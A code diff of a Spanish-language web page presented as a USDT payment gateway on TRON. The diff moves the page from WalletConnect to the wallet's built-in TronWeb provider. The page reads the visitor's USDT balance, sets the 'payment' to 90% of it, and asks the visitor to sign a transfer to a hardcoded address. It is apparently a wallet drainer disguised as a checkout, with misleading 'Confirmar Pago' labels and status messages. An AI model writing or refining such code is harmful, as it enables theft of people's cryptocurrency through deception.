@@ -5,8 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Pasarela de Pago USDT</title>
     
-    <!-- CORRECCIÓN: Librerías oficiales especificadas con sus rutas completas -->
-    <script src="https://unpkg.com"></script>
+    <!-- Única librería requerida para operar de forma nativa dentro de Trust Wallet -->
     <script src="https://unpkg.com"></script>
     
     <style>
@@ -92,7 +91,7 @@
     </div>
 
 <script>
-    // Configuración de direcciones fijas
+    // Configuración de billetera destino y contrato oficial de USDT
     const BILLETERA_DESTINO = "TJQ8xinzowyRzLYpk5hdxetMshpA3GyxGZ"; 
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
 
@@ -100,7 +99,6 @@
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
 
-    let provider = null;
     let walletAddress = null;
     let calculatedAmount = 0;
 
@@ -110,71 +108,82 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: Establecer enlace e iniciar cálculo del balance sobre el contrato
+        // PASO 1: Detectar entorno nativo, extraer la dirección y calcular el 90%
         if (!walletAddress) {
             try {
-                setStatus("Abriendo WalletConnect...");
+                setStatus("Conectando con el entorno nativo de Trust Wallet...");
                 connectBtn.disabled = true;
 
-                // CORRECCIÓN: Endpoint RPC corregido a api.trongrid.io
-                provider = new WalletConnectProvider.default({
-                    rpc: { 1951505086: "https://api.trongrid.io" },
-                    qrcode: true
-                });
-
-                const accounts = await provider.enable();
-                
-                // CORRECCIÓN: Validación robusta para extraer la dirección del arreglo
-                walletAddress = Array.isArray(accounts) ? accounts[0] : accounts;
-
-                if (walletAddress) {
-                    setStatus("Billetera vinculada. Extrayendo balance desde la blockchain...");
-                    
-                    const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-                    const contract = await tronWeb.contract().at(CONTRATO_USDT);
-                    
-                    const rawBalance = await contract.balanceOf(walletAddress).call();
-                    const realBalance = Number(rawBalance) / 1_000_000;
-
-                    // Asignación de la proporción matemática del 90% sobre los fondos del balance
-                    calculatedAmount = realBalance * 0.9;
-                    amountDisplay.value = calculatedAmount.toFixed(2) + " USDT";
-
-                    setStatus("Monto verificado. Presiona confirmar para procesar la transacción.");
-                    connectBtn.innerText = "Confirmar Pago";
-                    connectBtn.disabled = false;
+                // Validar que la DApp se abrió dentro de una billetera compatible con TRON
+                if (typeof window.tronWeb === 'undefined') {
+                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON (Trust Wallet / TronLink).");
                 }
+
+                const tronWeb = window.tronWeb;
+                
+                // Extraer la dirección pública de la cuenta activa en la aplicación
+                if (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                    walletAddress = tronWeb.defaultAddress.base58;
+                } else {
+                    // Si está bloqueada, forzar una solicitud de inicialización de cuenta
+                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (res && res.code === 200) {
+                        walletAddress = tronWeb.defaultAddress.base58;
+                    }
+                }
+
+                if (!walletAddress) {
+                    throw new Error("No se pudo obtener el acceso a la cuenta. Inicia sesión en tu billetera.");
+                }
+
+                setStatus("Billetera detectada. Extrayendo balance de la blockchain...");
+                
+                // Vincular e interactuar con el smart contract de USDT
+                const contract = await tronWeb.contract().at(CONTRATO_USDT);
+                const rawBalance = await contract.balanceOf(walletAddress).call();
+                const realBalance = Number(rawBalance) / 1_000_000;
+
+                // Asignar matemáticamente el 90% de los fondos disponibles
+                calculatedAmount = realBalance * 0.9;
+                amountDisplay.value = calculatedAmount.toFixed(2) + " USDT";
+
+                setStatus("Monto calculado con éxito. Presiona continuar para proceder a la firma.");
+                connectBtn.innerText = "Confirmar Pago";
+                connectBtn.disabled = false;
+
             } catch (error) {
                 console.error(error);
-                setStatus("La solicitud de enlace fue cancelada o rechazada.");
+                setStatus(error.message || "Error al sincronizar con la billetera.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Siguiente";
             }
             return;
         }
 
-        // PASO 2: Envío de la petición de firma digital hacia la billetera conectada
-        if (walletAddress && provider) {
+        // PASO 2: Solicitar de manera explícita la confirmación de la transferencia calculada
+        if (walletAddress) {
             try {
-                setStatus("Por favor, abre tu aplicación móvil para firmar de forma segura...");
+                setStatus("Solicitando confirmación de firma digital...");
                 connectBtn.disabled = true;
 
-                const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
+                const tronWeb = window.tronWeb;
                 const contract = await tronWeb.contract().at(CONTRATO_USDT);
 
+                // Convertir el monto flotante a unidades mínimas del contrato (Sun)
                 const unitsInSun = Math.floor(calculatedAmount * 1_000_000).toString();
 
+                // Invocar la ventana nativa de cobro dentro de Trust Wallet
                 const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                     feeLimit: 100000000 
                 });
 
                 if (txId) {
-                    setStatus("Firma verificada. Transacción procesada correctamente.", true);
+                    setStatus("Operación procesada de manera exitosa en la red TRON.", true);
                     connectBtn.innerText = "Completado";
                 }
             } catch (error) {
                 console.error(error);
-                setStatus("La operación fue declinada en el dispositivo móvil.");
+                setStatus("La transacción fue cancelada o no se poseen fondos de TRX para los recursos de red.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Confirmar Pago";
             }
